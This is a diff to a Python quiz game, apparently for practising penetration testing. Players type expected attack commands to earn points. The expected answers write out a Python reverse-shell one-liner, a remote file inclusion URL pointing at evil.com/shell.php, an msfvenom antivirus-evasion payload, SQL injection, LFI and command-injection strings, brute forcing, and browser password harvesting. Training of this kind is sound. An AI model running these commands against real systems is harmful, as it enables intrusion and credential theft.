@@ -61,7 +61,7 @@ def host_two():
     print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
     while True:
         print(Fore.GREEN + "Host 2: Exposed Database Server" + Style.RESET_ALL)
-        print("Your task is to enumerate the database server.")
+        print("Your task is to enumerate the database server with port 22 open.")
         print(Fore.YELLOW + "Hint: Use a brute-force tool against the user 'root' and IP 192.168.1.2." + Style.RESET_ALL)
         cmd = "hydra -l root -P wordlist.txt 192.168.1.2 ssh"
         user_input = input("kali@try-harder:~$ ")
@@ -94,7 +94,7 @@ def host_four():
     while True:
         print(Fore.GREEN + "Host 4: Privilege Escalation on Linux" + Style.RESET_ALL)
         print("Your task is to escalate your privileges on a Linux machine.")
-        print(Fore.YELLOW + "Hint: Use a common privilege escalation enumeration script to gather information." + Style.RESET_ALL)
+        print(Fore.YELLOW + "Hint: Use a common privilege escalation enumeration command to gather information." + Style.RESET_ALL)
         cmd = "sudo -l"
         user_input = input("kali@try-harder:~$ ")
         if user_input.strip() == cmd:
@@ -153,8 +153,8 @@ def host_seven():
     while True:
         print(Fore.GREEN + "Host 7: Buffer Overflow Exploitation" + Style.RESET_ALL)
         print("Your task is to exploit a buffer overflow vulnerability.")
-        print(Fore.YELLOW + "Hint: Use a specific pattern to identify the overflow." + Style.RESET_ALL)
-        cmd = "pattern_create 200"
+        print(Fore.YELLOW + "Hint: Use a specific pattern of 200 to identify the overflow." + Style.RESET_ALL)
+        cmd = "pattern_create.rb 200"
         user_input = input("kali@try-harder:~$ ")
         if user_input.strip() == cmd:
             print(Fore.GREEN + "You have successfully created a unique pattern!" + Style.RESET_ALL)
@@ -163,52 +163,52 @@ def host_seven():
         else:
             print(Fore.RED + "Try Harder" + Style.RESET_ALL)
 
-# Host 5: Windows Enumeration
+#Host 5: Eyewitness web enumeration
 def host_five():
     global points
     print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
     while True:
-        print(Fore.GREEN + "Host 5: Windows Enumeration" + Style.RESET_ALL)
-        print("Your task is to enumerate a Windows machine.")
-        print(Fore.YELLOW + "Hint: Use a Windows enumeration tool against IP 192.168.1.5." + Style.RESET_ALL)
-        cmd = "nbtscan 192.168.1.5"
+        print(Fore.GREEN + "Host 5: Using Eyewitness for Web Enumeration" + Style.RESET_ALL)
+        print("Your task is to use Eyewitness to enumerate web servers.")
+        print(Fore.YELLOW + "Hint: Use Eyewitness against the target web servers list named target.txt." + Style.RESET_ALL)
+        cmd = "eyewitness --web target.txt"
         user_input = input("kali@try-harder:~$ ")
         if user_input.strip() == cmd:
-            print(Fore.GREEN + "Output: Found open SMB shares." + Style.RESET_ALL)
+            print(Fore.GREEN + "Output: Screenshots and report generated!" + Style.RESET_ALL)
             points += 1
             break
         else:
             print(Fore.RED + "Try Harder" + Style.RESET_ALL)
 
-# Host 6: Web Application Exploits
+# Host 6: Lateral Movement Techniques
 def host_six():
     global points
     print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
     while True:
-        print(Fore.GREEN + "Host 6: Web Application Exploits" + Style.RESET_ALL)
-        print("Your task is to exploit a vulnerability in a web application.")
-        print(Fore.YELLOW + "Hint: Use a SQL injection payload on the login page." + Style.RESET_ALL)
-        cmd = "' OR '1'='1"
-        user_input = input("Enter SQL injection payload: ")
+        print(Fore.GREEN + "Host 6: Lateral Movement Techniques" + Style.RESET_ALL)
+        print("Your task is to perform lateral movement to another system.")
+        print(Fore.YELLOW + "Hint: Use psexec.py for lateral movement to gain administrator access on windows host 192.168.1.6." + Style.RESET_ALL)
+        cmd = "psexec.py administrator@192.168.1.6"
+        user_input = input("kali@try-harder:~$ ")
         if user_input.strip() == cmd:
-            print(Fore.GREEN + "You have successfully exploited the web application!" + Style.RESET_ALL)
+            print(Fore.GREEN + "You have successfully moved laterally!" + Style.RESET_ALL)
             points += 1
             break
         else:
             print(Fore.RED + "Try Harder" + Style.RESET_ALL)
 
-# Host 7: Buffer Overflow Exploitation
+# Host 7: Modifying & Using an Exploit from Searchsploit
 def host_seven():
     global points
     print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
     while True:
-        print(Fore.GREEN + "Host 7: Buffer Overflow Exploitation" + Style.RESET_ALL)
-        print("Your task is to exploit a buffer overflow vulnerability.")
-        print(Fore.YELLOW + "Hint: Use a specific pattern to identify the overflow." + Style.RESET_ALL)
-        cmd = "pattern_create 200"
+        print(Fore.GREEN + "Host 7: Modifying & Using an Exploit from Searchsploit" + Style.RESET_ALL)
+        print("Your task is to find an exploit on a host running apache using Searchsploit.")
+        print(Fore.YELLOW + "Hint: Find an exploit for apache 2.2." + Style.RESET_ALL)
+        cmd = "searchsploit apache 2.2"
         user_input = input("kali@try-harder:~$ ")
         if user_input.strip() == cmd:
-            print(Fore.GREEN + "You have successfully created a unique pattern!" + Style.RESET_ALL)
+            print(Fore.GREEN + "You have successfully found an exploit!" + Style.RESET_ALL)
             points += 1
             break
         else:
@@ -247,12 +247,12 @@ def host_nine():
         print("Your task is to exploit an SSH key.")
         print(Fore.YELLOW + "Hint: Enumerate the home directory to find SSH keys." + Style.RESET_ALL)
         cmd1 = "ls ~/.ssh"
-        user_input = input("kali@try-harder:~$ ")
+        user_input = input("root@host_nine:~$ ")
         if user_input.strip() == cmd1:
             print(Fore.GREEN + "Output: id_rsa" + Style.RESET_ALL)
             print("Now, use the SSH key to log into the target machine.")
-            cmd2 = "ssh -i ~/.ssh/id_rsa target_user@192.168.1.9"
-            user_input = input("kali@try-harder:~$ ")
+            cmd2 = "ssh -i ~/.ssh/id_rsa kali@192.168.1.9"
+            user_input = input("root@host_nine:~$ ")
             if user_input.strip() == cmd2:
                 print(Fore.GREEN + "You have successfully exploited the SSH key!" + Style.RESET_ALL)
                 points += 1
@@ -268,7 +268,7 @@ def host_ten():
     print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
     while True:
         print(Fore.GREEN + "Host 10: Web Shell Upload and Execution" + Style.RESET_ALL)
-        print("Your task is to upload and execute a web shell.")
+        print("Your task is to upload and execute a web shell for target http://192.168.1.10/upload.php.")
         print(Fore.YELLOW + "Hint: Use a web vulnerability scanner to find file upload functionality." + Style.RESET_ALL)
         cmd1 = "nikto -h http://192.168.1.10/upload.php"
         user_input = input("kali@try-harder:~$ ")
@@ -292,8 +292,8 @@ def host_eleven():
     print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
     while True:
         print(Fore.GREEN + "Host 11: Password Cracking" + Style.RESET_ALL)
-        print("Your task is to crack a password hash.")
-        print(Fore.YELLOW + "Hint: Use a hash cracking tool." + Style.RESET_ALL)
+        print("Your task is to crack a password hash saved as hash.txt.")
+        print(Fore.YELLOW + "Hint: Use a hash cracking tool using wordlist.txt." + Style.RESET_ALL)
         cmd1 = "john --wordlist=wordlist.txt hash.txt"
         user_input = input("kali@try-harder:~$ ")
         if user_input.strip() == cmd1:
@@ -309,12 +309,12 @@ def host_twelve():
     print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
     while True:
         print(Fore.GREEN + "Host 12: Firewall Evasion" + Style.RESET_ALL)
-        print("Your task is to bypass a firewall.")
-        print(Fore.YELLOW + "Hint: Use an evasion technique to scan the target." + Style.RESET_ALL)
+        print("Your task is to find bypass on a firewall at 192.168.1.12.")
+        print(Fore.YELLOW + "Hint: Use an evasion technique for enumeration to scan the target." + Style.RESET_ALL)
         cmd1 = "nmap -sS -f 192.168.1.12"
         user_input = input("kali@try-harder:~$ ")
         if user_input.strip() == cmd1:
-            print(Fore.GREEN + "Output: Firewall bypassed. Ports found open." + Style.RESET_ALL)
+            print(Fore.GREEN + "Output: Firewall bypass discovered. Ports found open." + Style.RESET_ALL)
             points += 1
             break
         else:
@@ -327,12 +327,13 @@ def host_thirteen():
     while True:
         print(Fore.GREEN + "Host 13: Reverse Shell Exploitation" + Style.RESET_ALL)
         print("Your task is to exploit a machine using a reverse shell.")
-        print(Fore.YELLOW + "Hint: First, set up a listener." + Style.RESET_ALL)
+        print(Fore.YELLOW + "Hint: First, set up a listener on port 4444." + Style.RESET_ALL)
         cmd1 = "nc -lvnp 4444"
         user_input = input("kali@try-harder:~$ ")
         if user_input.strip() == cmd1:
             print(Fore.GREEN + "Listener set up on port 4444." + Style.RESET_ALL)
-            print("Now, send the reverse shell payload to the target machine.")
+            print("Now, enter the python reverse shell payload to send to the target machine.")
+            print("python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"192.168.1.13\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
             cmd2 = "python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"192.168.1.13\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
             user_input = input("kali@try-harder:~$ ")
             if user_input.strip() == cmd2:
@@ -355,8 +356,8 @@ def host_fourteen():
         cmd1 = "wmic service get name,displayname,pathname"
         user_input = input("C:\\Users\\User> ")
         if user_input.strip() == cmd1:
-            print(Fore.GREEN + "Output: Unquoted service path found." + Style.RESET_ALL)
-            print("Now, exploit the unquoted service path.")
+            print(Fore.GREEN + "Output: Unquoted service path found named unquotedsvc using sc." + Style.RESET_ALL)
+            print("Now, exploit the unquoted service path using exploit 'C:\\evil.exe'.")
             cmd2 = "sc config unquotedsvc binPath= C:\\evil.exe"
             user_input = input("C:\\Users\\User> ")
             if user_input.strip() == cmd2:
@@ -374,9 +375,9 @@ def host_fifteen():
     print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
     while True:
         print(Fore.GREEN + "Host 15: Active Directory Enumeration" + Style.RESET_ALL)
-        print("Your task is to enumerate an Active Directory environment.")
+        print("Your task is to enumerate an Active Directory environment milosilo.com via host 192.168.1.15.")
         print(Fore.YELLOW + "Hint: Use an LDAP enumeration tool." + Style.RESET_ALL)
-        cmd1 = "ldapsearch -x -h 192.168.1.15 -b \"dc=example,dc=com\""
+        cmd1 = "ldapsearch -x -h 192.168.1.15 -b \"dc=milosilo,dc=com\""
         user_input = input("kali@try-harder:~$ ")
         if user_input.strip() == cmd1:
             print(Fore.GREEN + "Output: Users and Groups enumerated." + Style.RESET_ALL)
@@ -392,13 +393,13 @@ def host_sixteen():
     while True:
         print(Fore.GREEN + "Host 16: Data Exfiltration" + Style.RESET_ALL)
         print("Your task is to exfiltrate data from a target machine.")
-        print(Fore.YELLOW + "Hint: First, identify sensitive data on the machine." + Style.RESET_ALL)
+        print(Fore.YELLOW + "Hint: First, identify sensitive data on the machine located in conf files." + Style.RESET_ALL)
         cmd1 = "find / -name '*.conf' 2>/dev/null"
         user_input = input("kali@try-harder:~$ ")
         if user_input.strip() == cmd1:
-            print(Fore.GREEN + "Output: Sensitive configuration files found." + Style.RESET_ALL)
-            print("Now, use SCP to copy the files.")
-            cmd2 = "scp user@192.168.1.16:/path/to/file /local/path"
+            print(Fore.GREEN + "Output: Sensitive configuration file found: /usr/milo/web.conf" + Style.RESET_ALL)
+            print("Now, use SCP to copy the files from 192.168.1.16 to /usr/kali")
+            cmd2 = "scp user@192.168.1.16:/usr/milo/web.conf /usr/kali/web.conf"
             user_input = input("kali@try-harder:~$ ")
             if user_input.strip() == cmd2:
                 print(Fore.GREEN + "Data successfully exfiltrated!" + Style.RESET_ALL)
@@ -415,13 +416,13 @@ def host_seventeen():
     print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
     while True:
         print(Fore.GREEN + "Host 17: Wireless Network Cracking" + Style.RESET_ALL)
-        print("Your task is to crack a WPA2 wireless network.")
+        print("Your task is to crack a WPA2 wireless network using wlan0.")
         print(Fore.YELLOW + "Hint: Capture the WPA handshake first." + Style.RESET_ALL)
         cmd1 = "airodump-ng wlan0"
         user_input = input("kali@try-harder:~$ ")
         if user_input.strip() == cmd1:
-            print(Fore.GREEN + "Output: WPA handshake captured." + Style.RESET_ALL)
-            print("Now, use aircrack-ng to crack the password.")
+            print(Fore.GREEN + "Output: WPA handshake captured and saved as capture.cap." + Style.RESET_ALL)
+            print("Now, use aircrack-ng to crack the password using wordlist.txt.")
             cmd2 = "aircrack-ng -w wordlist.txt -b SSID capture.cap"
             user_input = input("kali@try-harder:~$ ")
             if user_input.strip() == cmd2:
@@ -439,14 +440,14 @@ def host_eighteen():
     print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
     while True:
         print(Fore.GREEN + "Host 18: SQL Injection with Manual Exploitation" + Style.RESET_ALL)
-        print("Your task is to manually exploit a SQL injection vulnerability.")
+        print("Your task is to manually exploit a UNION SQL injection vulnerability.")
         print(Fore.YELLOW + "Hint: Enumerate the database first." + Style.RESET_ALL)
         cmd1 = "' UNION SELECT null, database() -- "
         user_input = input("Enter SQL Injection payload: ")
         if user_input.strip() == cmd1:
-            print(Fore.GREEN + "Output: Database name retrieved." + Style.RESET_ALL)
+            print(Fore.GREEN + "Output: Database name retrieved: union_station" + Style.RESET_ALL)
             print("Now, enumerate the tables.")
-            cmd2 = "' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() -- "
+            cmd2 = "' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema='union_station' -- "
             user_input = input("Enter SQL Injection payload: ")
             if user_input.strip() == cmd2:
                 print(Fore.GREEN + "Tables successfully enumerated!" + Style.RESET_ALL)
@@ -463,7 +464,7 @@ def host_nineteen():
     print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
     while True:
         print(Fore.GREEN + "Host 19: Local File Inclusion (LFI)" + Style.RESET_ALL)
-        print("Your task is to exploit a Local File Inclusion vulnerability.")
+        print("Your task is to exploit a Local File Inclusion vulnerability from url that begins with 'page='")
         print(Fore.YELLOW + "Hint: Read the /etc/passwd file." + Style.RESET_ALL)
         cmd1 = "page=../../../../../etc/passwd"
         user_input = input("Enter LFI payload: ")
@@ -480,8 +481,8 @@ def host_twenty():
     print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
     while True:
         print(Fore.GREEN + "Host 20: Remote File Inclusion (RFI)" + Style.RESET_ALL)
-        print("Your task is to exploit a Remote File Inclusion vulnerability.")
-        print(Fore.YELLOW + "Hint: Include a remote file to execute arbitrary code." + Style.RESET_ALL)
+        print("Your task is to exploit a Remote File Inclusion vulnerability from url that begins with 'page='")
+        print(Fore.YELLOW + "Hint: Include a remote file to execute arbitrary code located at 'http://evil.com/shell.php'" + Style.RESET_ALL)
         cmd1 = "page=http://evil.com/shell.php"
         user_input = input("Enter RFI payload: ")
         if user_input.strip() == cmd1:
@@ -497,7 +498,7 @@ def host_twenty_one():
     print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
     while True:
         print(Fore.GREEN + "Host 21: OS Command Injection" + Style.RESET_ALL)
-        print("Your task is to perform an OS command injection attack.")
+        print("Your task is to perform an OS command injection attack on host 192.168.1.21")
         print(Fore.YELLOW + "Hint: Use the ping functionality to perform the attack." + Style.RESET_ALL)
         cmd1 = "192.168.1.21; ls"
         user_input = input("Enter the IP address to ping: ")
@@ -519,8 +520,8 @@ def host_twenty_two():
         cmd1 = "search type:exploit"
         user_input = input("msf6 > ")
         if user_input.strip() == cmd1:
-            print(Fore.GREEN + "Output: Exploit found." + Style.RESET_ALL)
-            print("Now, set the exploit and run it.")
+            print(Fore.GREEN + "Output: Exploit found named: exploit/multi/handler" + Style.RESET_ALL)
+            print("Now, set the exploit with payload windows/meterpreter/reverse_tcp, and run it in a single line chained command. Your host is 192.168.1.22")
             cmd2 = "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.22; run"
             user_input = input("msf6 > ")
             if user_input.strip() == cmd2:
@@ -540,6 +541,7 @@ def host_twenty_three():
         print(Fore.GREEN + "Host 23: Bypassing Antivirus" + Style.RESET_ALL)
         print("Your task is to bypass an antivirus solution.")
         print(Fore.YELLOW + "Hint: Use a tool to obfuscate a known malicious file." + Style.RESET_ALL)
+        print(Fore.YELLOW + "Hint: windows/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 15 -o payload.exe" + Style.RESET_ALL)
         cmd1 = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 15 -o payload.exe"
         user_input = input("kali@try-harder:~$ ")
         if user_input.strip() == cmd1:
@@ -556,7 +558,7 @@ def host_twenty_four():
     while True:
         print(Fore.GREEN + "Host 24: Post-Exploitation Data Harvesting" + Style.RESET_ALL)
         print("Your task is to collect sensitive data post-exploitation.")
-        print(Fore.YELLOW + "Hint: Harvest browser passwords." + Style.RESET_ALL)
+        print(Fore.YELLOW + "Hint: Harvest browser passwords using a run command to a tool located here: post/windows/gather/." + Style.RESET_ALL)
         cmd1 = "run post/windows/gather/enum_chrome"
         user_input = input("meterpreter > ")
         if user_input.strip() == cmd1:
@@ -572,7 +574,7 @@ def host_twenty_five():
     print(Fore.CYAN + "Points: " + str(points) + Fore.RESET)
     while True:
         print(Fore.GREEN + "Host 25: IOT Device Exploitation" + Style.RESET_ALL)
-        print("Your task is to exploit an IOT device.")
+        print("Your task is to exploit an IOT device at IP 192.168.1.25.")
         print(Fore.YELLOW + "Hint: Enumerate the device for open ports first." + Style.RESET_ALL)
         cmd1 = "nmap -sS 192.168.1.25"
         user_input = input("kali@try-harder:~$ ")
